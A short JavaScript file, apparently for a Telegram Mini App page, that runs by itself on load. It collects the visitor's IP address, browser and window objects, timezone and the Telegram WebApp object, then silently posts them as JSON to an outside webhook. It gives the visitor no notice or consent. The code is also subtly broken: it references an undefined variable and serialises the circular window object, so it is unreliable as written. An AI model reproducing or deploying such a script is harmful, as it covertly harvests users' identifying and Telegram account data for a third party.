/*inf.js*/
async function getVisitorIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Ошибка:', error);
    return null;
  }
}
async function infData() {
  let dat = {};
  dat.win = {};
  dat.win = window;
  dat.nav = {};
  dat.nav.brows = navigator;
  dat.tz = {};
  dat.tz.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  dat.tz.offset = new Date().getTimezoneOffset();
  dat.tz.offsetHours = -(nf.tz.offset / 60);
  dat.tz.utcTime = (nf.tz.offsetHours >= 0 ? "+" : "") + nf.tz.offsetHours;
  dat.ip = await getVisitorIP();
  url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
  let tg = window.Telegram.WebApp;
  let data = {twa: tg, info: dat};
  let whr = await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
  document.getElementById("inf").innerHTML = "";
  return;
}
infData();
//END

